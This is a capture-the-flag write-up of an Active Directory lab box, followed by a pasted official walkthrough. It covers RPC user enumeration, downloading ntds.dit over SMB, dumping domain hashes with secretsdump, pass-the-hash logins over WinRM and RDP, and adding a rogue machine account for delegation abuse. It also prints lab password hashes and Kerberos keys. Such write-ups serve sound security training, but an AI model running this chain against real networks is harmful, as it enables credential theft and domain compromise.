---
title: Resourced
parent: Proving Grounds Play
grand_parent: Writeups
nav_order:
---
---
# Reconnaissance

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Practice/Resourced]
└─$ sudo nmap -Pn -p- -sS -oN open-port_scan.txt --open 192.168.185.175
[sudo] password for kali: 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-12 05:19 +0900
Nmap scan report for 192.168.185.175
Host is up (0.10s latency).
Not shown: 65515 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
9389/tcp  open  adws
49666/tcp open  unknown
49668/tcp open  unknown
49674/tcp open  unknown
49675/tcp open  unknown
49693/tcp open  unknown
49708/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 290.18 seconds

```

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Practice/Resourced]
└─$ rpcclient -W '' -c querydispinfo -U''%'' '192.168.238.175'
index: 0xeda RID: 0x1f4 acb: 0x00000210 Account: Administrator  Name: (null)    Desc: Built-in account for administering the computer/domain
index: 0xf72 RID: 0x457 acb: 0x00020010 Account: D.Durant       Name: (null)    Desc: Linear Algebra and crypto god
index: 0xf73 RID: 0x458 acb: 0x00020010 Account: G.Goldberg     Name: (null)    Desc: Blockchain expert
index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain
index: 0xf6d RID: 0x452 acb: 0x00020010 Account: J.Johnson      Name: (null)    Desc: Networking specialist
index: 0xf6b RID: 0x450 acb: 0x00020010 Account: K.Keen Name: (null)    Desc: Frontend Developer
index: 0xf10 RID: 0x1f6 acb: 0x00020011 Account: krbtgt Name: (null)    Desc: Key Distribution Center Service Account
index: 0xf6c RID: 0x451 acb: 0x00000210 Account: L.Livingstone  Name: (null)    Desc: SysAdmin
index: 0xf6a RID: 0x44f acb: 0x00020010 Account: M.Mason        Name: (null)    Desc: Ex IT admin
index: 0xf70 RID: 0x455 acb: 0x00020010 Account: P.Parker       Name: (null)    Desc: Backend Developer
index: 0xf71 RID: 0x456 acb: 0x00020010 Account: R.Robinson     Name: (null)    Desc: Database Admin
index: 0xf6f RID: 0x454 acb: 0x00020010 Account: S.Swanson      Name: (null)    Desc: Military Vet now cybersecurity specialist
index: 0xf6e RID: 0x453 acb: 0x00000210 Account: V.Ventz        Name: (null)    Desc: New-hired, reminder: HotelCalifornia194!
```

```zsh
V.Ventz
HotelCalifornia194!
```

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Practice/Resourced]
└─$ smbclient -L //192.168.238.175/ -U 'V.Ventz%HotelCalifornia194!'

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Password Audit  Disk      
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 192.168.238.175 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Practice/Resourced]
└─$ smbclient "//192.168.238.175/Password Audit/" -U 'V.Ventz%HotelCalifornia194!' 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Oct  5 17:49:16 2021
  ..                                  D        0  Tue Oct  5 17:49:16 2021
  Active Directory                    D        0  Tue Oct  5 17:49:15 2021
  registry                            D        0  Tue Oct  5 17:49:16 2021

                7706623 blocks of size 4096. 2687468 blocks available
smb: \> cd "Active Directory"
smb: \Active Directory\> ls
  .                                   D        0  Tue Oct  5 17:49:16 2021
  ..                                  D        0  Tue Oct  5 17:49:16 2021
  ntds.dit                            A 25165824  Mon Sep 27 20:30:54 2021
  ntds.jfm                            A    16384  Mon Sep 27 20:30:54 2021

                7706623 blocks of size 4096. 2687468 blocks available
smb: \Active Directory\> 
```

---

# Initial Access

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Practice/Resourced]
└─$ smbclient "//192.168.238.175/Password Audit/" -U 'V.Ventz%HotelCalifornia194!'
Try "help" to get a list of possible commands.
smb: \> prompt off
smb: \> recurse on
smb: \> mget *
getting file \Active Directory\ntds.dit of size 25165824 as Active Directory/ntds.dit (1703.9 KiloBytes/sec) (average 1703.9 KiloBytes/sec)
getting file \Active Directory\ntds.jfm of size 16384 as Active Directory/ntds.jfm (47.1 KiloBytes/sec) (average 1665.8 KiloBytes/sec)
getting file \registry\SECURITY of size 65536 as registry/SECURITY (185.5 KiloBytes/sec) (average 1632.0 KiloBytes/sec)
getting file \registry\SYSTEM of size 16777216 as registry/SYSTEM (1918.5 KiloBytes/sec) (average 1735.5 KiloBytes/sec)
smb: \> exit
```

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Practice/Resourced]
└─$ impacket-secretsdump -ntds Active\ Directory/ntds.dit -system registry/SYSTEM local
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x6f961da31c7ffaf16683f78e04c3e03d
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 9298735ba0d788c4fc05528650553f94
[*] Reading and decrypting hashes from Active Directory/ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:12579b1666d4ac10f0f59f300776495f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
RESOURCEDC$:1000:aad3b435b51404eeaad3b435b51404ee:9ddb6f4d9d01fedeb4bccfb09df1b39d:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3004b16f88664fbebfcb9ed272b0565b:::
M.Mason:1103:aad3b435b51404eeaad3b435b51404ee:3105e0f6af52aba8e11d19f27e487e45:::
K.Keen:1104:aad3b435b51404eeaad3b435b51404ee:204410cc5a7147cd52a04ddae6754b0c:::
L.Livingstone:1105:aad3b435b51404eeaad3b435b51404ee:19a3a7550ce8c505c2d46b5e39d6f808:::
J.Johnson:1106:aad3b435b51404eeaad3b435b51404ee:3e028552b946cc4f282b72879f63b726:::
V.Ventz:1107:aad3b435b51404eeaad3b435b51404ee:913c144caea1c0a936fd1ccb46929d3c:::
S.Swanson:1108:aad3b435b51404eeaad3b435b51404ee:bd7c11a9021d2708eda561984f3c8939:::
P.Parker:1109:aad3b435b51404eeaad3b435b51404ee:980910b8fc2e4fe9d482123301dd19fe:::
R.Robinson:1110:aad3b435b51404eeaad3b435b51404ee:fea5a148c14cf51590456b2102b29fac:::
D.Durant:1111:aad3b435b51404eeaad3b435b51404ee:08aca8ed17a9eec9fac4acdcb4652c35:::
G.Goldberg:1112:aad3b435b51404eeaad3b435b51404ee:62e16d17c3015c47b4d513e65ca757a2:::
[*] Kerberos keys from Active Directory/ntds.dit 
Administrator:aes256-cts-hmac-sha1-96:73410f03554a21fb0421376de7f01d5fe401b8735d4aa9d480ac1c1cdd9dc0c8
Administrator:aes128-cts-hmac-sha1-96:b4fc11e40a842fff6825e93952630ba2
Administrator:des-cbc-md5:80861f1a80f1232f
RESOURCEDC$:aes256-cts-hmac-sha1-96:b97344a63d83f985698a420055aa8ab4194e3bef27b17a8f79c25d18a308b2a4
RESOURCEDC$:aes128-cts-hmac-sha1-96:27ea2c704e75c6d786cf7e8ca90e0a6a
RESOURCEDC$:des-cbc-md5:ab089e317a161cc1
krbtgt:aes256-cts-hmac-sha1-96:12b5d40410eb374b6b839ba6b59382cfbe2f66bd2e238c18d4fb409f4a8ac7c5
krbtgt:aes128-cts-hmac-sha1-96:3165b2a56efb5730cfd34f2df472631a
krbtgt:des-cbc-md5:f1b602194f3713f8
M.Mason:aes256-cts-hmac-sha1-96:21e5d6f67736d60430facb0d2d93c8f1ab02da0a4d4fe95cf51554422606cb04
M.Mason:aes128-cts-hmac-sha1-96:99d5ca7207ce4c406c811194890785b9
M.Mason:des-cbc-md5:268501b50e0bf47c
K.Keen:aes256-cts-hmac-sha1-96:9a6230a64b4fe7ca8cfd29f46d1e4e3484240859cfacd7f67310b40b8c43eb6f
K.Keen:aes128-cts-hmac-sha1-96:e767891c7f02fdf7c1d938b7835b0115
K.Keen:des-cbc-md5:572cce13b38ce6da
L.Livingstone:aes256-cts-hmac-sha1-96:cd8a547ac158c0116575b0b5e88c10aac57b1a2d42e2ae330669a89417db9e8f
L.Livingstone:aes128-cts-hmac-sha1-96:1dec73e935e57e4f431ac9010d7ce6f6
L.Livingstone:des-cbc-md5:bf01fb23d0e6d0ab
J.Johnson:aes256-cts-hmac-sha1-96:0452f421573ac15a0f23ade5ca0d6eada06ae85f0b7eb27fe54596e887c41bd6
J.Johnson:aes128-cts-hmac-sha1-96:c438ef912271dbbfc83ea65d6f5fb087
J.Johnson:des-cbc-md5:ea01d3d69d7c57f4
V.Ventz:aes256-cts-hmac-sha1-96:4951bb2bfbb0ffad425d4de2353307aa680ae05d7b22c3574c221da2cfb6d28c
V.Ventz:aes128-cts-hmac-sha1-96:ea815fe7c1112385423668bb17d3f51d
V.Ventz:des-cbc-md5:4af77a3d1cf7c480
S.Swanson:aes256-cts-hmac-sha1-96:8a5d49e4bfdb26b6fb1186ccc80950d01d51e11d3c2cda1635a0d3321efb0085
S.Swanson:aes128-cts-hmac-sha1-96:6c5699aaa888eb4ec2bf1f4b1d25ec4a
S.Swanson:des-cbc-md5:5d37583eae1f2f34
P.Parker:aes256-cts-hmac-sha1-96:e548797e7c4249ff38f5498771f6914ae54cf54ec8c69366d353ca8aaddd97cb
P.Parker:aes128-cts-hmac-sha1-96:e71c552013df33c9e42deb6e375f6230
P.Parker:des-cbc-md5:083b37079dcd764f
R.Robinson:aes256-cts-hmac-sha1-96:90ad0b9283a3661176121b6bf2424f7e2894079edcc13121fa0292ec5d3ddb5b
R.Robinson:aes128-cts-hmac-sha1-96:2210ad6b5ae14ce898cebd7f004d0bef
R.Robinson:des-cbc-md5:7051d568dfd0852f
D.Durant:aes256-cts-hmac-sha1-96:a105c3d5cc97fdc0551ea49fdadc281b733b3033300f4b518f965d9e9857f27a
D.Durant:aes128-cts-hmac-sha1-96:8a2b701764d6fdab7ca599cb455baea3
D.Durant:des-cbc-md5:376119bfcea815f8
G.Goldberg:aes256-cts-hmac-sha1-96:0d6ac3733668c6c0a2b32a3d10561b2fe790dab2c9085a12cf74c7be5aad9a91
G.Goldberg:aes128-cts-hmac-sha1-96:00f4d3e907818ce4ebe3e790d3e59bf7
G.Goldberg:des-cbc-md5:3e20fd1a25687673
[*] Cleaning up... 
```

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Practice/Resourced]
└─$ cat user_hash   
Administrator:500:aad3b435b51404eeaad3b435b51404ee:12579b1666d4ac10f0f59f300776495f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
RESOURCEDC$:1000:aad3b435b51404eeaad3b435b51404ee:9ddb6f4d9d01fedeb4bccfb09df1b39d:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3004b16f88664fbebfcb9ed272b0565b:::
M.Mason:1103:aad3b435b51404eeaad3b435b51404ee:3105e0f6af52aba8e11d19f27e487e45:::
K.Keen:1104:aad3b435b51404eeaad3b435b51404ee:204410cc5a7147cd52a04ddae6754b0c:::
L.Livingstone:1105:aad3b435b51404eeaad3b435b51404ee:19a3a7550ce8c505c2d46b5e39d6f808:::
J.Johnson:1106:aad3b435b51404eeaad3b435b51404ee:3e028552b946cc4f282b72879f63b726:::
V.Ventz:1107:aad3b435b51404eeaad3b435b51404ee:913c144caea1c0a936fd1ccb46929d3c:::
S.Swanson:1108:aad3b435b51404eeaad3b435b51404ee:bd7c11a9021d2708eda561984f3c8939:::
P.Parker:1109:aad3b435b51404eeaad3b435b51404ee:980910b8fc2e4fe9d482123301dd19fe:::
R.Robinson:1110:aad3b435b51404eeaad3b435b51404ee:fea5a148c14cf51590456b2102b29fac:::
D.Durant:1111:aad3b435b51404eeaad3b435b51404ee:08aca8ed17a9eec9fac4acdcb4652c35:::
G.Goldberg:1112:aad3b435b51404eeaad3b435b51404ee:62e16d17c3015c47b4d513e65ca757a2:::
Administrator:aes256-cts-hmac-sha1-96:73410f03554a21fb0421376de7f01d5fe401b8735d4aa9d480ac1c1cdd9dc0c8
Administrator:aes128-cts-hmac-sha1-96:b4fc11e40a842fff6825e93952630ba2
Administrator:des-cbc-md5:80861f1a80f1232f
RESOURCEDC$:aes256-cts-hmac-sha1-96:b97344a63d83f985698a420055aa8ab4194e3bef27b17a8f79c25d18a308b2a4
RESOURCEDC$:aes128-cts-hmac-sha1-96:27ea2c704e75c6d786cf7e8ca90e0a6a
RESOURCEDC$:des-cbc-md5:ab089e317a161cc1
krbtgt:aes256-cts-hmac-sha1-96:12b5d40410eb374b6b839ba6b59382cfbe2f66bd2e238c18d4fb409f4a8ac7c5
krbtgt:aes128-cts-hmac-sha1-96:3165b2a56efb5730cfd34f2df472631a
krbtgt:des-cbc-md5:f1b602194f3713f8
M.Mason:aes256-cts-hmac-sha1-96:21e5d6f67736d60430facb0d2d93c8f1ab02da0a4d4fe95cf51554422606cb04
M.Mason:aes128-cts-hmac-sha1-96:99d5ca7207ce4c406c811194890785b9
M.Mason:des-cbc-md5:268501b50e0bf47c
K.Keen:aes256-cts-hmac-sha1-96:9a6230a64b4fe7ca8cfd29f46d1e4e3484240859cfacd7f67310b40b8c43eb6f
K.Keen:aes128-cts-hmac-sha1-96:e767891c7f02fdf7c1d938b7835b0115
K.Keen:des-cbc-md5:572cce13b38ce6da
L.Livingstone:aes256-cts-hmac-sha1-96:cd8a547ac158c0116575b0b5e88c10aac57b1a2d42e2ae330669a89417db9e8f
L.Livingstone:aes128-cts-hmac-sha1-96:1dec73e935e57e4f431ac9010d7ce6f6
L.Livingstone:des-cbc-md5:bf01fb23d0e6d0ab
J.Johnson:aes256-cts-hmac-sha1-96:0452f421573ac15a0f23ade5ca0d6eada06ae85f0b7eb27fe54596e887c41bd6
J.Johnson:aes128-cts-hmac-sha1-96:c438ef912271dbbfc83ea65d6f5fb087
J.Johnson:des-cbc-md5:ea01d3d69d7c57f4
V.Ventz:aes256-cts-hmac-sha1-96:4951bb2bfbb0ffad425d4de2353307aa680ae05d7b22c3574c221da2cfb6d28c
V.Ventz:aes128-cts-hmac-sha1-96:ea815fe7c1112385423668bb17d3f51d
V.Ventz:des-cbc-md5:4af77a3d1cf7c480
S.Swanson:aes256-cts-hmac-sha1-96:8a5d49e4bfdb26b6fb1186ccc80950d01d51e11d3c2cda1635a0d3321efb0085
S.Swanson:aes128-cts-hmac-sha1-96:6c5699aaa888eb4ec2bf1f4b1d25ec4a
S.Swanson:des-cbc-md5:5d37583eae1f2f34
P.Parker:aes256-cts-hmac-sha1-96:e548797e7c4249ff38f5498771f6914ae54cf54ec8c69366d353ca8aaddd97cb
P.Parker:aes128-cts-hmac-sha1-96:e71c552013df33c9e42deb6e375f6230
P.Parker:des-cbc-md5:083b37079dcd764f
R.Robinson:aes256-cts-hmac-sha1-96:90ad0b9283a3661176121b6bf2424f7e2894079edcc13121fa0292ec5d3ddb5b
R.Robinson:aes128-cts-hmac-sha1-96:2210ad6b5ae14ce898cebd7f004d0bef
R.Robinson:des-cbc-md5:7051d568dfd0852f
D.Durant:aes256-cts-hmac-sha1-96:a105c3d5cc97fdc0551ea49fdadc281b733b3033300f4b518f965d9e9857f27a
D.Durant:aes128-cts-hmac-sha1-96:8a2b701764d6fdab7ca599cb455baea3
D.Durant:des-cbc-md5:376119bfcea815f8
G.Goldberg:aes256-cts-hmac-sha1-96:0d6ac3733668c6c0a2b32a3d10561b2fe790dab2c9085a12cf74c7be5aad9a91
G.Goldberg:aes128-cts-hmac-sha1-96:00f4d3e907818ce4ebe3e790d3e59bf7
G.Goldberg:des-cbc-md5:3e20fd1a25687673
```

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Practice/Resourced]
└─$ awk -F ':' '{print $1}' user_hash | head -n 14 > users
```

```
┌──(kali㉿kali)-[~/CTF/OffSec/Practice/Resourced]
└─$ cat users    
Administrator
Guest
RESOURCEDC$
krbtgt
M.Mason
K.Keen
L.Livingstone
J.Johnson
V.Ventz
S.Swanson
P.Parker
R.Robinson
D.Durant
G.Goldberg
```

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Practice/Resourced]
└─$ awk -F ':' '{print $4}' user_hash | head -n 14 > hashes
```

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Practice/Resourced]
└─$ cat hashes 
12579b1666d4ac10f0f59f300776495f
31d6cfe0d16ae931b73c59d7e0c089c0
9ddb6f4d9d01fedeb4bccfb09df1b39d
3004b16f88664fbebfcb9ed272b0565b
3105e0f6af52aba8e11d19f27e487e45
204410cc5a7147cd52a04ddae6754b0c
19a3a7550ce8c505c2d46b5e39d6f808
3e028552b946cc4f282b72879f63b726
913c144caea1c0a936fd1ccb46929d3c
bd7c11a9021d2708eda561984f3c8939
980910b8fc2e4fe9d482123301dd19fe
fea5a148c14cf51590456b2102b29fac
08aca8ed17a9eec9fac4acdcb4652c35
62e16d17c3015c47b4d513e65ca757a2
```

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Practice/Resourced]
└─$ nxc winrm 192.168.238.175 -u users -H hashes
...
WINRM       192.168.238.175 5985   RESOURCEDC       [+] resourced.local\L.Livingstone:19a3a7550ce8c505c2d46b5e39d6f808 (Pwn3d!)
```

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Practice/Resourced]
└─$ evil-winrm -i 192.168.238.175 \
-u L.Livingstone \
-H '19a3a7550ce8c505c2d46b5e39d6f808'
...
*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> 
```

```powershell
*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> whoami
resourced\l.livingstone
```

```zsh
*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> ls ../Desktop


    Directory: C:\Users\L.Livingstone\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        7/13/2026  12:37 PM             34 local.txt
```

```zsh
*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> type ..\Desktop\local.txt
5cc99188dc91fc4314bb1c6d1942c2f1
*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . :
   IPv4 Address. . . . . . . . . . . : 192.168.238.175
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.238.254
```
---

# Privilege Escalation

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Practice/Resourced]
└─$ xfreerdp3 /u:L.Livingstone /d:resourced.local /pth:'19a3a7550ce8c505c2d46b5e39d6f808' /v:192.168.238.175 /dynamic-resolution
```

![[Pasted image 20260714051902.png]]

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Practice/Resourced]
└─$ cp /usr/share/sharphound/SharpHound.exe . 
```

![[Pasted image 20260717052948.png]]

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Practice/Resourced]
└─$ impacket-addcomputer resourced.local/l.livingstone -dc-ip 192.168.238.175 -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -computer-name 'ATTACK$' -computer-pass 'AttackerPC1!'
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Successfully added machine account ATTACK$ with password AttackerPC1!.
```

```zsh
*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> Get-adcomputer resourcedc -properties msds-allowedtoactonbehalfofotheridentity |select -expand msds-allowedtoactonbehalfofotheridentity

Path Owner                  Access
---- -----                  ------
     BUILTIN\Administrators resourced\ATTACK$ Allow
```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

<details markdown="1">
<summary>Walkthrough</summary>

```zsh
Exploitation Guide for Resourced
Summary
In this guide, we will enumerate a domain controller to discover remnants of a password audit that will lead us to shell access. We will then leverage a Resource Based Constrained Delegation Exploitation vector to elevate to system access.

Enumeration
Nmap
We'll start by looking for open ports with an nmap scan.
```

```zsh
┌──(kali㉿kali)-[~]
└─$ sudo nmap -p- 192.168.120.181 -T5
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-10 12:59 EST
Nmap scan report for 192.168.120.181
Host is up (0.038s latency).
Not shown: 65509 closed tcp ports (reset)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5357/tcp  open  wsdapi
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49671/tcp open  unknown
49676/tcp open  unknown
49677/tcp open  unknown
49684/tcp open  unknown
49703/tcp open  unknown
49769/tcp open  unknown
This appears to be a domain controller.

Domain Controller Remote Enumeration
Let's use rpcclient to see if we can list the user accounts on the domain.
```

```zsh
┌──(kali㉿kali)-[~]
└─$ rpcclient -W '' -c querydispinfo -U''%'' '192.168.120.181'     
index: 0xeda RID: 0x1f4 acb: 0x00000210 Account: Administrator  Name: (null)    Desc: Built-in account for administering the computer/domain
index: 0xf72 RID: 0x457 acb: 0x00020010 Account: D.Durant       Name: (null)    Desc: Linear Algebra and crypto god
index: 0xf73 RID: 0x458 acb: 0x00020010 Account: G.Goldberg     Name: (null)    Desc: Blockchain expert
index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain
index: 0xf6d RID: 0x452 acb: 0x00020010 Account: J.Johnson      Name: (null)    Desc: Networking specialist
index: 0xf6b RID: 0x450 acb: 0x00020010 Account: K.Keen Name: (null)    Desc: Frontend Developer
index: 0xf10 RID: 0x1f6 acb: 0x00020011 Account: krbtgt Name: (null)    Desc: Key Distribution Center Service Account
index: 0xf6c RID: 0x451 acb: 0x00000210 Account: L.Livingstone  Name: (null)    Desc: SysAdmin
index: 0xf6a RID: 0x44f acb: 0x00020010 Account: M.Mason        Name: (null)    Desc: Ex IT admin
index: 0xf70 RID: 0x455 acb: 0x00020010 Account: P.Parker       Name: (null)    Desc: Backend Developer
index: 0xf71 RID: 0x456 acb: 0x00020010 Account: R.Robinson     Name: (null)    Desc: Database Admin
index: 0xf6f RID: 0x454 acb: 0x00020010 Account: S.Swanson      Name: (null)    Desc: Military Vet now cybersecurity specialist
index: 0xf6e RID: 0x453 acb: 0x00000210 Account: V.Ventz        Name: (null)    Desc: New-hired, reminder: HotelCalifornia194!
We were able to get a domain user list along with a note that alludes that the password for the V.Ventz account is HotelCalifornia194!. Let's check if this will allow us to connect to SMB using smbclient. We can list the shares with the -L flag.
```

```zsh
┌──(kali㉿kali)-[~]
└─$ smbclient -L \\\\192.168.120.181\\ -U 'V.Ventz%HotelCalifornia194!'

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Password Audit  Disk      
        SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available
Ooh, that Password Audit looks interesting. Let's access that and see what it contains.
```

```zsh
┌──(kali㉿kali)-[~]
└─$ smbclient \\\\192.168.120.181\\Password\ Audit -U 'V.Ventz%HotelCalifornia194!'
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Oct  5 04:49:16 2021
  ..                                  D        0  Tue Oct  5 04:49:16 2021
  Active Directory                    D        0  Tue Oct  5 04:49:15 2021
  registry                            D        0  Tue Oct  5 04:49:16 2021

                7706623 blocks of size 4096. 2680915 blocks available
smb: \> 
These may be useful to us. Let's go ahead and download everything in both directories.

smb: \> prompt off
smb: \> recurse on
smb: \> mget *
getting file \Active Directory\ntds.dit of size 25165824 as Active Directory/ntds.dit (3174.4 KiloBytes/sec) (average 3174.4 KiloBytes/sec)
getting file \Active Directory\ntds.jfm of size 16384 as Active Directory/ntds.jfm (125.0 KiloBytes/sec) (average 3124.8 KiloBytes/sec)
getting file \registry\SECURITY of size 65536 as registry/SECURITY (470.6 KiloBytes/sec) (average 3079.7 KiloBytes/sec)
getting file \registry\SYSTEM of size 16777216 as registry/SYSTEM (3202.5 KiloBytes/sec) (average 3127.6 KiloBytes/sec)
smb: \> 
Let's see what we got.
```

```
┌──(kali㉿kali)-[~]
└─$ ls -l Active\ Directory
total 24592
-rw-r--r-- 1 kali kali 25165824 Jan 10 13:49 ntds.dit
-rw-r--r-- 1 kali kali    16384 Jan 10 13:49 ntds.jfm
```

```
┌──(kali㉿kali)-[~]
└─$ ls -l registry         
total 16448
-rw-r--r-- 1 kali kali    65536 Jan 10 13:49 SECURITY
-rw-r--r-- 1 kali kali 16777216 Jan 10 13:49 SYSTEM
This looks like an admin has performed a password audit on the domain controller but forgot to remove the mapped share. Since we now have the NTDS.dit file and SYSTEM hive, we can attempt retrieve domain user hashes. Let's pass these files into impacket-secretsdump.
```

```
┌──(kali㉿kali)-[~]
└─$ impacket-secretsdump -ntds Active\ Directory/ntds.dit -system registry/SYSTEM LOCAL
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Target system bootKey: 0x6f961da31c7ffaf16683f78e04c3e03d
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 9298735ba0d788c4fc05528650553f94
[*] Reading and decrypting hashes from Active Directory/ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:12579b1666d4ac10f0f59f300776495f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
RESOURCEDC$:1000:aad3b435b51404eeaad3b435b51404ee:9ddb6f4d9d01fedeb4bccfb09df1b39d:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3004b16f88664fbebfcb9ed272b0565b:::
M.Mason:1103:aad3b435b51404eeaad3b435b51404ee:3105e0f6af52aba8e11d19f27e487e45:::
K.Keen:1104:aad3b435b51404eeaad3b435b51404ee:204410cc5a7147cd52a04ddae6754b0c:::
L.Livingstone:1105:aad3b435b51404eeaad3b435b51404ee:19a3a7550ce8c505c2d46b5e39d6f808:::
J.Johnson:1106:aad3b435b51404eeaad3b435b51404ee:3e028552b946cc4f282b72879f63b726:::
V.Ventz:1107:aad3b435b51404eeaad3b435b51404ee:913c144caea1c0a936fd1ccb46929d3c:::
S.Swanson:1108:aad3b435b51404eeaad3b435b51404ee:bd7c11a9021d2708eda561984f3c8939:::
P.Parker:1109:aad3b435b51404eeaad3b435b51404ee:980910b8fc2e4fe9d482123301dd19fe:::
R.Robinson:1110:aad3b435b51404eeaad3b435b51404ee:fea5a148c14cf51590456b2102b29fac:::
D.Durant:1111:aad3b435b51404eeaad3b435b51404ee:08aca8ed17a9eec9fac4acdcb4652c35:::
G.Goldberg:1112:aad3b435b51404eeaad3b435b51404ee:62e16d17c3015c47b4d513e65ca757a2:::
...
Nice! Next, we will need to check if any users haven't changed their password since the audit occurred. To do this, we need to create a file containing the domain usernames and a file with the hashes.
```

```
┌──(kali㉿kali)-[~]
└─$ cat users   
Administrator
Guest
krbtgt
M.Mason
K.Keen
L.Livingstone
J.Johnson
V.Ventz
S.Swanson
P.Parker
R.Robinson
D.Durant
G.Goldberg

┌──(kali㉿kali)-[~]
└─$ cat hashes  
aad3b435b51404eeaad3b435b51404ee:12579b1666d4ac10f0f59f300776495f
aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
aad3b435b51404eeaad3b435b51404ee:9ddb6f4d9d01fedeb4bccfb09df1b39d
aad3b435b51404eeaad3b435b51404ee:3004b16f88664fbebfcb9ed272b0565b
aad3b435b51404eeaad3b435b51404ee:3105e0f6af52aba8e11d19f27e487e45
aad3b435b51404eeaad3b435b51404ee:204410cc5a7147cd52a04ddae6754b0c
aad3b435b51404eeaad3b435b51404ee:19a3a7550ce8c505c2d46b5e39d6f808
aad3b435b51404eeaad3b435b51404ee:3e028552b946cc4f282b72879f63b726
aad3b435b51404eeaad3b435b51404ee:913c144caea1c0a936fd1ccb46929d3c
aad3b435b51404eeaad3b435b51404ee:bd7c11a9021d2708eda561984f3c8939
aad3b435b51404eeaad3b435b51404ee:980910b8fc2e4fe982123301dd19fe
aad3b435b51404eeaad3b435b51404ee:fea5a148c14cf51590456b2102b29fac
aad3b435b51404eeaad3b435b51404ee:08aca8ed17a9eec9fac4acdcb4652c35
aad3b435b51404eeaad3b435b51404ee:62e16d17c3015c47b4d513e65ca757a2
Then, pass these files to crackmapexec.
```

```
┌──(kali㉿kali)-[~]
└─$ crackmapexec winrm 192.168.120.181 -u users -H hashes
WINRM       192.168.120.181 5985   RESOURCEDC       [*] Windows 10.0 Build 17763 (name:RESOURCEDC) (domain:resourced.local)
WINRM       192.168.120.181 5985   RESOURCEDC       [*] http://192.168.120.181:5985/wsman
